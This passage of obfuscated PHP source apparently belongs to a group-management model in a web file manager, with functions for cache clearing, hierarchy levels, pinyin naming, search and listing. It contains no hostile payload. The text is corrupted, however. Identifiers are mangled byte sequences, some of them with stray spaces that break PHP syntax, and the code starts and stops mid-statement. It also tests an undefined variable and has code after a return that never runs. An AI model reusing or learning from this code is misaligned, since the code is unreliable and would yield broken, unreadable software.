(isset($ã”§‚ÁÀ[$ØıÄ á[2089]])) { $Şşüó¢î = $ØıÄ á[1403] . $€†Û×Û¢; $¾ÒÅêØ½ = $ØıÄ á[1402]; $­çµ”™ = $ã”§‚ÁÀ[$ØıÄ á[2089]] ? $ã”§‚ÁÀ[$ØıÄ á[2089]] : $ØıÄ á[12]; $ü€¼Èßå = Model($ØıÄ á[1401])->get($Şşüó¢î, $¾ÒÅêØ½); $ü€¼Èßå = $ü€¼Èßå ? $ü€¼Èßå : $ØıÄ á[12]; if ($ü€¼Èßå != $­çµ”™) { if (!$­çµ”™ && $ü€¼Èßå) { Model($ØıÄ á[1401])->remove($Şşüó¢î, $¾ÒÅêØ½); } else { if ($­çµ”™) { Model($ØıÄ á[1401])->set($Şşüó¢î, $­çµ”™, $¾ÒÅêØ½); } } } $ÍËŞ×ÒÑ[$ØıÄ á[2089]] = $­çµ”™; } $this->metaSet($€†Û×Û¢, $ÍËŞ×ÒÑ); } } private function _clearChildrenCache($©¼œ¾À´) { $›ïÍ›Õˆ =& $_SERVER[´‹ô¯Œ]; $Ì¤ğş² = array($›ïÍ›Õˆ[669] => array($›ïÍ›Õˆ[629], $©¼œ¾À´[$›ïÍ›Õˆ[598]] . $©¼œ¾À´[$›ïÍ›Õˆ[1407]] . $›ïÍ›Õˆ[630])); $ã¦‰­ãó = $this->field($›ïÍ›Õˆ[1407])->where($Ì¤ğş²)->select(); foreach ($ã¦‰­ãó as $å›Š”Í¤) { $this->_clearCache($å›Š”Í¤[$›ïÍ›Õˆ[1407]]); } } private function _clearCache($»¢İ‚úˆ) { $è¯×Ü‹ =& $_SERVER[´‹ô¯Œ]; $this->cacheFunctionClear($è¯×Ü‹[2082], $»¢İ‚úˆ); $this->cacheFunctionClear($è¯×Ü‹[2083], $»¢İ‚úˆ); } private function _changeChildLevel($„‹Â¡¢­, $›‡î‘—, $„Ü¿Ïû = false) { $¢„ˆ”ˆ =& $_SERVER[´‹ô¯Œ]; $üœÛ¥¥ = $„‹Â¡¢­[$¢„ˆ”ˆ[598]] . $„‹Â¡¢­[$¢„ˆ”ˆ[1407]] . $¢„ˆ”ˆ[50]; $‚áÒØ°Ë = $›‡î‘—[$¢„ˆ”ˆ[598]] . $›‡î‘—[$¢„ˆ”ˆ[1407]] . $¢„ˆ”ˆ[50] . $„‹Â¡¢­[$¢„ˆ”ˆ[1407]] . $¢„ˆ”ˆ[50]; if ($„Ü¿Ïû) { $‚áÒØ°Ë = $›‡î‘—[$¢„ˆ”ˆ[598]] . $›‡î‘—[$¢„ˆ”ˆ[1407]] . $¢„ˆ”ˆ[50]; } $Šƒ…© = array($¢„ˆ”ˆ[669] => array($¢„ˆ”ˆ[629], $„‹Â¡¢­[$¢„ˆ”ˆ[598]] . $„‹Â¡¢­[$¢„ˆ”ˆ[1407]] . $¢„ˆ”ˆ[630])); $¬ÊÀ„ñÅ = array($¢„ˆ”ˆ[669] => array($¢„ˆ”ˆ[678], "\162\x65\x70\x6c\141\x63\145\x28\x70\141\162\145\156\164\x4c\145\x76\x65\x6c\54\x27{$üœÛ¥¥}\x27\54\47{$‚áÒØ°Ë}\47\x29")); $this->_clearChildrenCache($„‹Â¡¢­); $this->where($Šƒ…©)->data($¬ÊÀ„ñÅ)->save(); } public function setNamePinyin($¹¤Œ•°Á, $à×€õ§– = false) { $Äóª¨Êà =& $_SERVER[´‹ô¯Œ]; if (!$à×€õ§–) { $ù›–Éš = $this->getInfoSimple($¹¤Œ•°Á); $à×€õ§– = $ù›–Éš[$Äóª¨Êà[32]]; } if (!Input::check($à×€õ§–, $Äóª¨Êà[672])) { $this->metaSet($¹¤Œ•°Á, $Äóª¨Êà[550], null); $this->metaSet($¹¤Œ•°Á, $Äóª¨Êà[549], null); return; } $è¡àÅï¤ = array($Äóª¨Êà[550] => str_replace($Äóª¨Êà[53], $Äóª¨Êà[12], Pinyin::get($à×€õ§–)), $Äóª¨Êà[549] => Pinyin::get($à×€õ§–, $Äóª¨Êà[673])); $this->metaSet($¹¤Œ•°Á, $è¡àÅï¤); } protected function metaSet($ì¸íàûÔ, $¿¨É¬³ = null, $±¯ôÎ¨Ÿ = null) { $this->_clearCache($ì¸íàûÔ); return parent::metaSet($ì¸íàûÔ, $¿¨É¬³, $±¯ôÎ¨Ÿ); } protected function groupStatus($îì—ş„š, $éØ¿”¬å) { $âÂ²ÍÙÍ =& $_SERVER[´‹ô¯Œ]; $¤Í§ËÁ¼ = $this->getInfoSimple($îì—ş„š); if (!$¤Í§ËÁ¼) { return !1; } $this->_clearCache($îì—ş„š); return $this->metaSet($îì—ş„š, $âÂ²ÍÙÍ[836], $éØ¿”¬å); if ($éØ¿”¬å == $âÂ²ÍÙÍ[91]) { $Ø©İÜšÙ = $this->parentLevelArray($¤Í§ËÁ¼[$âÂ²ÍÙÍ[598]]); } else { } $Ø©İÜšÙ[] = $¤Í§ËÁ¼[$âÂ²ÍÙÍ[1407]]; $¶¸Åß¹ß = array(); foreach ($Ø©İÜšÙ as $îì—ş„š) { $¶¸Åß¹ß[] = array($âÂ²ÍÙÍ[1407] => $îì—ş„š, $âÂ²ÍÙÍ[97] => $âÂ²ÍÙÍ[836], $âÂ²ÍÙÍ[453] => $éØ¿”¬å); $this->_clearCache($îì—ş„š); } return Model($âÂ²ÍÙÍ[2090])->addAll($¶¸Åß¹ß, array(), !0); } protected function groupRemove($òƒ¬ÑÑØ, $¢¸º³öü = false) { $¬¯Œì› =& $_SERVER[´‹ô¯Œ]; $ÀšáÓŠ“ = array($¬¯Œì›[1407] => $òƒ¬ÑÑØ); $•›–Ó§ü = $this->where($ÀšáÓŠ“)->find(); if (!$•›–Ó§ü || $•›–Ó§ü[$¬¯Œì›[193]] == 0) { return !1; } if (!$¢¸º³öü) { $–íìÄÉê = $this->getInfoSimple($•›–Ó§ü[$¬¯Œì›[193]]); $this->_changeChildLevel($•›–Ó§ü, $–íìÄÉê, !0); $this->where(array($¬¯Œì›[193] => $òƒ¬ÑÑØ))->save(array($¬¯Œì›[193] => $•›–Ó§ü[$¬¯Œì›[193]])); $this->_clearCache($–íìÄÉê[$¬¯Œì›[1407]]); } Model($¬¯Œì›[2090])->where($ÀšáÓŠ“)->delete(); Model($¬¯Œì›[2091])->where($ÀšáÓŠ“)->delete(); Model($¬¯Œì›[916])->groupRootRemove($òƒ¬ÑÑØ); $this->_clearCache($•›–Ó§ü[$¬¯Œì›[193]]); return $this->where($ÀšáÓŠ“)->delete(); } protected function groupSort($ƒ¡Ã£ÕÑ) { $şÓç–Çü =& $_SERVER[´‹ô¯Œ]; $áäõÛ¦È = array(); foreach ($ƒ¡Ã£ÕÑ as $áÔ€°ÍÏ => $·ÀÂò­‰) { $áäõÛ¦È[] = array($şÓç–Çü[1407], $·ÀÂò­‰, $şÓç–Çü[2020], $áÔ€°ÍÏ + 1); } $this->saveAll($áäõÛ¦È); } public function listData() { $şÌˆË‡¢ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($şÌˆË‡¢[$_SERVER[´‹ô¯Œ][448]]); return $şÌˆË‡¢; } private function _makeOrder($ˆ”¯Æ’³ = '') { $¼›üÁ¯ı =& $_SERVER[´‹ô¯Œ]; $ŞÉ¯šèŸ = array($¼›üÁ¯ı[1407], $¼›üÁ¯ı[32], $¼›üÁ¯ı[1985], $¼›üÁ¯ı[234]); $¼Ã¨íÑÊ = array($¼›üÁ¯ı[535] => $¼›üÁ¯ı[536], $¼›üÁ¯ı[537] => $¼›üÁ¯ı[538]); $ßòÇ±Ôô = Input::get($¼›üÁ¯ı[542], $¼›üÁ¯ı[7], $¼›üÁ¯ı[2000], $ŞÉ¯šèŸ); $Ú¯Ş½½ = Input::get($¼›üÁ¯ı[543], $¼›üÁ¯ı[7], $¼›üÁ¯ı[2092], array($¼›üÁ¯ı[2092], $¼›üÁ¯ı[537])); $Ú¯Ş½½ = $¼Ã¨íÑÊ[$Ú¯Ş½½]; $ˆ”¯Æ’³ = $ˆ”¯Æ’³ . "{$ßòÇ±Ôô}\40{$Ú¯Ş½½}\x2c\40\x67\x72\x6f\x75\x70\x49\104\40\141\163\143"; return $this->order($ˆ”¯Æ’³); } public function listChild($Ó²ãÑÏ‘) { $Ú–×¯İ =& $_SERVER[´‹ô¯Œ]; $Ø¬Œã² = $this->where(array($Ú–×¯İ[193] => $Ó²ãÑÏ‘))->_makeOrder()->selectPage(200); $this->_listDataApply($Ø¬Œã²[$Ú–×¯İ[448]]); return $Ø¬Œã²; } public function listChildIds($üÂ¦ãÙ‘) { $ÓÈ¼‘á =& $_SERVER[´‹ô¯Œ]; if (is_string($á–ûëŒÇ)) { $üÂ¦ãÙ‘ = explode($ÓÈ¼‘á[50], $üÂ¦ãÙ‘); } $¾©„üì = $this->where(array($ÓÈ¼‘á[1407] => array($ÓÈ¼‘á[7], $üÂ¦ãÙ‘)))->field($ÓÈ¼‘á[2093])->select(); if (!$¾©„üì) { return !1; } $Ÿ©³Éàø = array(); foreach ($¾©„üì as $Æı‚ÓßÔ) { $Ÿ©³Éàø[] = "\163\x65\154\145\143\164\x20\x67\x72\157\x75\x70\x49\x44\x20\146\162\157\x6d\40\x60\x67\x72\157\165\160\140\40\x77\150\x65\162\x65\x20\x70\x61\x72\145\156\x74\x4c\x65\x76\x65\x6c\x20\x6c\151\x6b\145\x20\47{$Æı‚ÓßÔ[$ÓÈ¼‘á[598]]}{$Æı‚ÓßÔ[$ÓÈ¼‘á[1407]]}\x2c\x25\47"; } $Ÿ©³Éàø = implode($ÓÈ¼‘á[2094], $Ÿ©³Éàø); $¾©„üì = $this->query($Ÿ©³Éàø); if (!$¾©„üì) { return array(); } $üÂ¦ãÙ‘ = array_to_keyvalue($¾©„üì, $ÓÈ¼‘á[12], $ÓÈ¼‘á[1407]); return array_unique($üÂ¦ãÙ‘); } public function listByID($Şö€Ñ–Ï) { $³ŠŞÕ«© =& $_SERVER[´‹ô¯Œ]; if (!$Şö€Ñ–Ï) { return array(); } $ÅÃ¸¿×ë = array($³ŠŞÕ«©[1407] => array($³ŠŞÕ«©[7], $Şö€Ñ–Ï)); $Ç…õ¾ÓÄ = $this->where($ÅÃ¸¿×ë)->select(); $Ç…õ¾ÓÄ = array_sort_keep($Ç…õ¾ÓÄ, $³ŠŞÕ«©[1407], $Şö€Ñ–Ï); $this->_listDataApply($Ç…õ¾ÓÄ); return $Ç…õ¾ÓÄ; } public function listSearch($æ‰‹ÆŒğ) { $ãÍ³ºè§ =& $_SERVER[´‹ô¯Œ]; $è³¤š‡â = trim($æ‰‹ÆŒğ[$ãÍ³ºè§[2095]]); $¼ƒäµÌ = explode($ãÍ³ºè§[53], $è³¤š‡â); if (!$è³¤š‡â || count($¼ƒäµÌ) == 1) { return $this->listSearchNow($æ‰‹ÆŒğ); } $ÌÆ¬›Û² = array($ãÍ³ºè§[448] => array()); foreach ($¼ƒäµÌ as $Ó“ÆØØö) { if (!trim($Ó“ÆØØö)) { continue; } $æ‰‹ÆŒğ[$ãÍ³ºè§[2095]] = $Ó“ÆØØö; $Î—òØµ÷ = $this->listSearchNow($æ‰‹ÆŒğ); $ÌÆ¬›Û²[$ãÍ³ºè§[448]] = array_merge($ÌÆ¬›Û²[$ãÍ³ºè§[448]], $Î—òØµ÷[$ãÍ³ºè§[448]]); } $ÌÆ¬›Û²[$ãÍ³ºè§[448]] = array_unique_by_key($ÌÆ¬›Û²[$ãÍ³ºè§[448]], $ãÍ³ºè§[1407]); $ÌÆ¬›Û²[$ãÍ³ºè§[445]] = array($ãÍ³ºè§[446] => count($ÌÆ¬›Û²[$ãÍ³ºè§[448]]), $ãÍ³ºè§[442] => 20, $ãÍ³ºè§[431] => 1, $ãÍ³ºè§[447] => 1); return $ÌÆ¬›Û²; } public function listSearchNow($õø—Ñâ) { $¡¡š¶î =& $_SERVER[´‹ô¯Œ]; $î©îµ¾ò = trim($õø—Ñâ[$¡¡š¶î[2095]]); $ÉÚ†„Êò = isset($õø—Ñâ[$¡¡š¶î[2096]]) ? $õø—Ñâ[$¡¡š¶î[2096]] : !1; if (!trim($î©îµ¾ò)) { return !1; } $î©îµ¾ò = str_replace($¡¡š¶î[2097], $¡¡š¶î[2098], $î©îµ¾ò); $¹”ÑâàÅ = array($¡¡š¶î[1407] => array($¡¡š¶î[462], "{$î©îµ¾ò}\45"), $¡¡š¶î[32] => array($¡¡š¶î[462], "\45{$î©îµ¾ò}\45"), $¡¡š¶î[1092] => $¡¡š¶î[2099]); if ($ÉÚ†„Êò) { $é¶œÎ¼¯ = $this->getInfoSimple($ÉÚ†„Êò); $¨°•ÃÏ° = $é¶œÎ¼¯[$¡¡š¶î[598]] . $ÉÚ†„Êò . $¡¡š¶î[630]; $¹”ÑâàÅ = array($¹”ÑâàÅ, array($¡¡š¶î[598] => array($¡¡š¶î[462], $¨°•ÃÏ°))); } $¹”ÑâàÅ = $this->parseWhereLike($¹”ÑâàÅ); $ú³ÎŒß = $this->_makeOrder()->where($¹”ÑâàÅ)->selectPage(20); $ú³ÎŒß = $ú³ÎŒß ? $ú³ÎŒß : array($¡¡š¶î[448] => array(), $¡¡š¶î[445] => array()); if (!$ú³ÎŒß || count($ú³ÎŒß[$¡¡š¶î[448]]) < 5 && Input::check($î©îµ¾ò, $¡¡š¶î[396])) { $‘Ë”ÏÒø = $this->groupChildrenAll($ÉÚ†„Êò); $İò–ğàé = $this->_searchFromMeta($¡¡š¶î[549], $î©îµ¾ò, 10, $‘Ë”ÏÒø); $ÚÕ²€ÀÈ = $this->_searchFromMeta($¡¡š¶î[550], $î©îµ¾ò, 10, $‘Ë”ÏÒø); $‚îÊ” ‰ = array_merge($İò–ğàé, $ÚÕ²€ÀÈ, $ú³ÎŒß[$¡¡š¶î[448]]); $ú³ÎŒß[$¡¡š¶î[448]] = array_unique_by_key($‚îÊ” ‰, $¡¡š¶î[1407]); $ú³ÎŒß[$¡¡š¶î[445]][$¡¡š¶î[446]] = count($ú³ÎŒß[$¡¡š¶î[448]]); $ú³ÎŒß[$¡¡š¶î[445]][$¡¡š¶î[447]] = ceil($ú³ÎŒß[$¡¡š¶î[445]][$¡¡š¶î[446]] / $ú³ÎŒß[$¡¡š¶î[445]][$¡¡š¶î[442]]); } $this->_listDataApply($ú³ÎŒß[$¡¡š¶î[448]]); return $ú³ÎŒß; } protected function groupChildrenAll($ƒùË¥¥) { $ëÛÊ…üõ =& $_SERVER[´‹ô¯Œ]; if (!$ƒùË¥¥) { return !1; } if (!is_array($ƒùË¥¥)) { $ƒùË¥¥ = array($ƒùË¥¥); } $Ş¡ˆ€°À = $ƒùË¥¥; foreach ($ƒùË¥¥ as $‚·©ÈïÔ) { $ˆ¤Á·’¶ = $this->getInfoSimple($‚·©ÈïÔ); $¯ïÂ¦æ = array($ëÛÊ…üõ[598] => array($ëÛÊ…üõ[462], $ˆ¤Á·’¶[$ëÛÊ…üõ[598]] . $‚·©ÈïÔ . $ëÛÊ…üõ[630])); $ü³âœí = $this->field($ëÛÊ…üõ[1407])->where($¯ïÂ¦æ)->select(); $Ş¡ˆ€°À = array_merge($Ş¡ˆ€°À, array_to_keyvalue($ü³âœí, $ëÛÊ…üõ[12], $ëÛÊ…üõ[1407])); } return array_unique($Ş¡ˆ€°À); } private function _searchFromMeta($‘ˆ¸óÓ–, $¾£ÑÂşû, $ã¯û·é™, $ÙÙŞÑáï) { $å¿œü·û =& $_SERVER[´‹ô¯Œ]; $¾£ÑÂşû = strtolower($¾£ÑÂşû); $ÙµÏ—•Ê = array($å¿œü·û[97] => $‘ˆ¸óÓ–, $å¿œü·û[453] => array($å¿œü·û[462], "\45{$¾£ÑÂşû}\45")); $ÙµÏ—•Ê = $this->parseWhereLike($ÙµÏ—•Ê); if ($ÙÙŞÑáï) { $ÙµÏ—•Ê[$å¿œü·û[1407]] = array($å¿œü·û[7], $ÙÙŞÑáï); } $”—Íİ¤Û = Model($å¿œü·û[2100])->where($ÙµÏ—•Ê)->limit($ã¯û·é™)->select(); if (!$”—Íİ¤Û) { return array(); } $”—Íİ¤Û = array_to_keyvalue($”—Íİ¤Û, $å¿œü·û[12], $å¿œü·û[1407]); $ÆåÁº’‚ = $this->where(array($å¿œü·û[2086] => array($å¿œü·û[7], $”—Íİ¤Û)))->select(); if (!$ÆåÁº’‚) { return array(); } return $ÆåÁº’‚; } protected function _listDataApplyItem($¸ÍŸÅ™) { $ºÃ˜Òüü = array($¸ÍŸÅ™); $this->_listDataApply($ºÃ˜Òüü); return $ºÃ˜Òüü[0]; } protected function _listDataApply(&$ÒÂ™æÙş) { $ÅÙÏ¿·û =& $_SERVER[´‹ô¯Œ]; if (!$ÒÂ™æÙş) { return; } $†ëšùëÇ = array_to_keyvalue($ÒÂ™æÙş, $ÅÙÏ¿·û[12], $ÅÙÏ¿·û[1407]); $this->_listAppendChildren($ÒÂ™æÙş); $this->_listAppendChildrenMember($ÒÂ™æÙş); $this->_listAppendMeta($ÒÂ™æÙş, $†ëšùëÇ); $this->_listAppendParent($ÒÂ™æÙş); $this->_listAppendSourceRoot($ÒÂ™æÙş, $†ëšùëÇ); } private function _listAppendChildren(&$¡‚…§¼ê) { $Ö¿¸Áè =& $_SERVER[´‹ô¯Œ]; $ÖéÛá¸ = array_to_keyvalue($¡‚…§¼ê, $Ö¿¸Áè[12], $Ö¿¸Áè[1407]); $Ó—€¿Äé = array($Ö¿¸Áè[193] => array($Ö¿¸Áè[7], $ÖéÛá¸)); $Õ­†›Úü = array($Ö¿¸Áè[193], $Ö¿¸Áè[2101] => $Ö¿¸Áè[579]); $ÆÛŸ”Ê = $this->field($Õ­†›Úü)->where($Ó—€¿Äé)->group($Ö¿¸Áè[193])->select(); $Õ…öÕ³Ç = array_to_keyvalue($ÆÛŸ”Ê, $Ö¿¸Áè[193], $Ö¿¸Áè[579]); foreach ($¡‚…§¼ê as &$¹ÆüÖ¾ô) { $Ê¸ÔŠæ = $¹ÆüÖ¾ô[$Ö¿¸Áè[1407]]; $¹ÆüÖ¾ô[$Ö¿¸Áè[2102]] = isset($Õ…öÕ³Ç[$Ê¸ÔŠæ]) ? intval($Õ…öÕ³Ç[$Ê¸ÔŠæ]) : !1; } unset($¹ÆüÖ¾ô); } private function _listAppendChildrenMember(&$€µœÍö) { $ÌİµùÁû =& $_SERVER[´‹ô¯Œ]; $æ†ï¡„ö = array_to_keyvalue($€µœÍö, $ÌİµùÁû[12], $ÌİµùÁû[1407]); $ÔÛ¹¦Ù¨ = array($ÌİµùÁû[1407] => array($ÌİµùÁû[7], $æ†ï¡„ö)); $Õ£ÁÇÛ = array($ÌİµùÁû[1407], $ÌİµùÁû[2101] => $ÌİµùÁû[579]); $Ë®Í ¢¶ = Model($ÌİµùÁû[2091])->field($Õ£ÁÇÛ)->where($ÔÛ¹¦Ù¨)->group($ÌİµùÁû[1407])->select(); $Ğ¦ØïÊ­ = array_to_keyvalue($Ë®Í ¢¶, $ÌİµùÁû[1407], $ÌİµùÁû[579]); foreach ($€µœÍö as &$µ€¸–) { $Ñ›©ÜÔ = $µ€¸–[$ÌİµùÁû[1407]]; $µ€¸–[$ÌİµùÁû[2103]] = isset($Ğ¦ØïÊ­[$Ñ›©ÜÔ]) ? intval($Ğ¦ØïÊ­[$Ñ›©ÜÔ]) : !1; } unset($µ€¸–); } private function _listAppendMeta(&$ƒù¼ÎØ‡, $Ÿ– ºë) { $ì„úÔèø =& $_SERVER[´‹ô¯Œ]; $Á º×’— = array($ì„úÔèø[1407] => array($ì„úÔèø[7], $Ÿ– ºë)); $¤Ğæèá = Model($ì„úÔèø[2090])->where($Á º×’—)->select(); $¤Ğæèá = array_to_keyvalue_group($¤Ğæèá, $ì„úÔèø[1407]); foreach ($¤Ğæèá as &$³ëİ–¼á) { $³ëİ–¼á = array_to_keyvalue($³ëİ–¼á, $ì„úÔèø[97], $ì„úÔèø[453]); } unset($³ëİ–¼á); foreach ($ƒù¼ÎØ‡ as &$‹ÌŒ¤ë™) { $‹ÌŒ¤ë™[$ì„úÔèø[553]] = array(); if (isset($¤Ğæèá[$‹ÌŒ¤ë™[$ì„úÔèø[1407]]])) { $‹ÌŒ¤ë™[$ì„úÔèø[553]] = $¤Ğæèá[$‹ÌŒ¤ë™[$ì„úÔèø[1407]]]; } } unset($‹ÌŒ¤ë™); } protected function parentLevelArray($¤ºá±ß) { $åˆ³†¢ =& $_SERVER[´‹ô¯Œ]; $¤ºá±ß = explode($åˆ³†¢[50], trim($¤ºá±ß, $åˆ³†¢[50])); $¤ºá±ß = array_remove_value($¤ºá±ß, $åˆ³†¢[231]); return $¤ºá±ß; } protected function parentInGroup($ÍÑ¤¶ÕÙ, $­¡«‡’Ô) { $Æ‡‡°àÑ =& $_SERVER[´‹ô¯Œ]; $¶ú÷½¾ß = $this->getInfoSimple($ÍÑ¤¶ÕÙ); if (!$¶ú÷½¾ß) { return !0; } $Ì¾òà±µ = $this->parentLevelArray($¶ú÷½¾ß[$Æ‡‡°àÑ[598]]); $Ì¾òà±µ[] = $ÍÑ¤¶ÕÙ; foreach ($Ì¾òà±µ as $ÍÑ¤¶ÕÙ) { if (in_array($ÍÑ¤¶ÕÙ . $Æ‡‡°àÑ[12], $­¡«‡’Ô)) { return !0; } } return !1; } private function _listAppendParent(&$†‹•¯şœ) { $î¶‹çË¸ =& $_SERVER[´‹ô¯Œ]; $Î±’´¥Ş = array(); foreach ($†‹•¯şœ as &$»êß¯) { $Î±’´¥Ş[$»êß¯[$î¶‹çË¸[1407]]] = $»êß¯[$î¶‹çË¸[32]]; $•ÙçÀó = $this->parentLevelArray($»êß¯[$î¶‹çË¸[598]]); foreach ($•ÙçÀó as $ÓÆ¨—¹) { if (!isset($Î±’´¥Ş[$ÓÆ¨—¹])) { $Î±’´¥Ş[$ÓÆ¨—¹] = 0; } } } unset($»êß¯); foreach ($Î±’´¥Ş as $Õ˜²© ­ => $ûéŠ€©ç) { if ($ûéŠ€©ç) { continue; } $˜£ØÓ‚ = $this->getInfoSimple($Õ˜²© ­); $Î±’´¥Ş[$Õ˜²© ­] = $˜£ØÓ‚[$î¶‹çË¸[32]]; } $®¬”ö×à = $GLOBALS[$î¶‹çË¸[6]][$î¶‹çË¸[92]][$î¶‹çË¸[2104]]; if (KodUser::isRoot()) { $®¬”ö×à = !1; } foreach ($†‹•¯şœ as &$»êß¯) { $•ÙçÀó = $this->parentLevelArray($»êß¯[$î¶‹çË¸[598]]); $¼Üô•¿ø = $î¶‹çË¸[12]; foreach ($•ÙçÀó as $Õ˜²© ­ => $ÓÆ¨—¹) { if ($®¬”ö×à && $Õ˜²© ­ == 0) { continue; } $¼Üô•¿ø .= $Î±’´¥Ş[$ÓÆ¨—¹] . $î¶‹çË¸[8]; } if ($•ÙçÀó) { $¼Üô•¿ø .= $»êß¯[$î¶‹çË¸[32]]; } $»êß¯[$î¶‹çË¸[603]] = str_replace($î¶‹çË¸[257], $î¶‹çË¸[8], $¼Üô•¿ø); } unset($»êß¯); } private function _listAppendSourceRoot(&$Çê¬é‡, $ï½Ü­§³) { $×„·ê¤ =& $_SERVER[´‹ô¯Œ]; $›üÜÜ¬í = Model($×„·ê¤[916])->listSourceRoot(SourceModel::TYPE_GROUP, $ï½Ü­§³); $›üÜÜ¬í = array_to_keyvalue($›üÜÜ¬í, $×„·ê¤[583]); $›üÜÜ¬í = array_remove_key($›üÜÜ¬í, $×„·ê¤[583]); foreach ($Çê¬é‡ as &$«ŠÇ‚ñ) { $«ŠÇ‚ñ[$×„·ê¤[90]] = $›üÜÜ¬í[$«ŠÇ‚ñ[$×„·ê¤[1407]]] ? $›üÜÜ¬í[$«ŠÇ‚ñ[$×„·ê¤[1407]]] : array(); } unset($«ŠÇ‚ñ); } protected function groupMerge($ò”ĞĞıä) { $ò”ĞĞıä = array_values(array_unique($ò”ĞĞıä)); $¢±Ûò»Ã = array(); for ($ÄÑËã™Î = 0; $ÄÑËã™Î < count($ò”ĞĞıä); $ÄÑËã™Î++) { $†ïïİàÔ = !1; for ($¶Ë»ò ¯ = 0; $¶Ë»ò ¯ < count($ò”ĞĞıä); $¶Ë»ò ¯++) { if ($ÄÑËã™Î == $¶Ë»ò ¯) { continue; } if ($this->isParentOf($ò”ĞĞıä[$¶Ë»ò ¯], $ò”ĞĞıä[$ÄÑËã™Î])) { $†ïïİàÔ = !0; break; } } if (!$†ïïİàÔ) { $¢±Ûò»Ã[] = $ò”ĞĞıä[$ÄÑËã™Î]; } } return $¢±Ûò»Ã; } protected function isParentOf($óÉ«»Ò, $éïœÇã¤) { $¥Î³§© =& $_SERVER[´‹ô¯Œ]; if (!$óÉ«»Ò || !$éïœÇã¤ || $óÉ«»Ò == $éïœÇã¤) { return !1; } $±°¶Ù²¯ = $this->getInfoSimple($óÉ«»Ò); $øÔ¢å­Í = $this->getInfoSimple($éïœÇã¤); $ãìëË• = $±°¶Ù²¯[$¥Î³§©[598]] . $óÉ«»Ò . $¥Î³§©[50]; if (substr($øÔ¢å­Í[$¥Î³§©[598]], 0, strlen($ãìëË•)) == $ãìëË•) { return !0; } return !1; } public function groupShowRoot($øŸÒ¥Şó, $†´—€å› = false) { $Ââ¡õªÕ =& $_SERVER[´‹ô¯Œ]; $õ”Š½Šà = $this->getInfo($øŸÒ¥Şó); if (!$õ”Š½Šà) { return array(); } $½•…Š’ì = $this->parentLevelArray($õ”Š½Šà[$Ââ¡õªÕ[598]]); $êùÑ¶ñ± = array($øŸÒ¥Şó); if (count($½•…Š’ì) == 0) { return $êùÑ¶ñ±; } if ($†´—€å› && count($½•…Š’ì) == 1) { return $êùÑ¶ñ±; } if (!$õ”Š½Šà[$Ââ¡õªÕ[553]] || !isset($õ”Š½Šà[$Ââ¡õªÕ[553]][$Ââ¡õªÕ[2087]]) || $õ”Š½Šà[$Ââ¡õªÕ[553]][$Ââ¡õªÕ[2087]] == $Ââ¡õªÕ[862]) { return $this->groupShowRoot($½•…Š’ì[count($½•…Š’ì) - 1], $†´—€å›); } if ($õ”Š½Šà[$Ââ¡õªÕ[553]][$Ââ¡õªÕ[2087]] == $Ââ¡õªÕ[435]) { $«ÛÖƒ¡é = explode($Ââ¡õªÕ[50], $õ”Š½Šà[$Ââ¡õªÕ[553]][$Ââ¡õªÕ[2088]]); if ($«ÛÖƒ¡é) { $êùÑ¶ñ± = array_merge($êùÑ¶ñ±, $«ÛÖƒ¡é); } } return $êùÑ¶ñ±; } protected function resetParentLevel() { $æŠ‘´Ÿ° =& $_SERVER[´‹ô¯Œ]; $á°…”‹¢ = $æŠ‘´Ÿ°[1407]; $ˆÄ¿µ‡ = $this->select(); $ˆÄ¿µ‡ = array_to_keyvalue($ˆÄ¿µ‡, $á°…”‹¢); foreach ($ˆÄ¿µ‡ as $“¡Ìùğ‡) { $èäÉâƒã = $“¡Ìùğ‡; $î¦ÕÑ„ = array(); while ($èäÉâƒã[$æŠ‘´Ÿ°[193]] != 0) { $î¦ÕÑ„[] = $èäÉâƒã[$æŠ‘´Ÿ°[193]]; $èäÉâƒã = $ˆÄ¿µ‡[$èäÉâƒã[$æŠ‘´Ÿ°[193]]]; } $î¦ÕÑ„[] = 0; $î¦ÕÑ„ = $æŠ‘´Ÿ°[50] . implode($æŠ‘´Ÿ°[50], array_reverse($î¦ÕÑ„)) . $æŠ‘´Ÿ°[50]; $this->setNamePinyin($“¡Ìùğ‡[$á°…”‹¢], $“¡Ìùğ‡[$æŠ‘´Ÿ°[32]]); $this->where(array($á°…”‹¢ => $“¡Ìùğ‡[$á°…”‹¢]))->save(array($æŠ‘´Ÿ°[669] => $î¦ÕÑ„)); } return $ˆÄ¿µ‡; } public function groupNameAuto($İ½Ÿöˆ¼, $ÎØƒ•ì²) { $ş·–¹Â¾ =& $_SERVER[´‹ô¯Œ]; $êæ‹Ö±ˆ = $this->where(array($ş·–¹Â¾[489] => $İ½Ÿöˆ¼))->getField($ş·–¹Â¾[32], !0); if (!$êæ‹Ö±ˆ || !in_array($ÎØƒ•ì², $êæ‹Ö±ˆ)) { return $ÎØƒ•ì²; } for ($µ‘™±˜Á = 1; $µ‘™±˜Á <= count($êæ‹Ö±ˆ) + 1; $µ‘™±˜Á++) { $½ÏŒ·Òô = $ÎØƒ•ì² . "\x28{$µ‘™±˜Á}\x29"; if (!in_array($½ÏŒ·Òô, $êæ‹Ö±ˆ)) { return $½ÏŒ·Òô; } } } public function groupSwitch($¤Øª«Ø¥, $ş‚§Û‰½) { $¡ŒÊª¥Š =& $_SERVER[´‹ô¯Œ]; $‹ş˜ˆõç = array($¡ŒÊª¥Š[1407] => array($¡ŒÊª¥Š[7], array($¤Øª«Ø¥, $ş‚§Û‰½))); $ã‹¿á¹ = $this->where($‹ş˜ˆõç)->select(); $ã‹¿á¹ = array_to_keyvalue($ã‹¿á¹, $¡ŒÊª¥Š[1407]); if (!isset($ã‹¿á¹[$¤Øª«Ø¥]) || !isset($ã‹¿á¹[$ş‚§Û‰½]) || $ã‹¿á¹[$¤Øª«Ø¥][$¡ŒÊª¥Š[193]] == 0) { return !1; } $‹ş˜ˆõç = array($¡ŒÊª¥Š[1407] => $¤Øª«Ø¥); $¡¬Äì¿ = Model($¡ŒÊª¥Š[2091])->where($‹ş˜ˆõç)->select(); if (!$¡¬Äì¿) { $¡¬Äì¿ = array(); } foreach ($¡¬Äì¿ as $†Éš„Úõ) { $“’°à÷“ = $†Éš„Úõ[$¡ŒÊª¥Š[1796]]; $‹ş˜ˆõç = array($¡ŒÊª¥Š[1796] => $“’°à÷“, $¡ŒÊª¥Š[1407] => $ş‚§Û‰½); $¯•Âšû† = Model($¡ŒÊª¥Š[2091])->where($‹ş˜ˆõç)->find(); if (!$¯•Âšû†) { $Ş˜œÚ¾÷ = array($ş‚§Û‰½ => 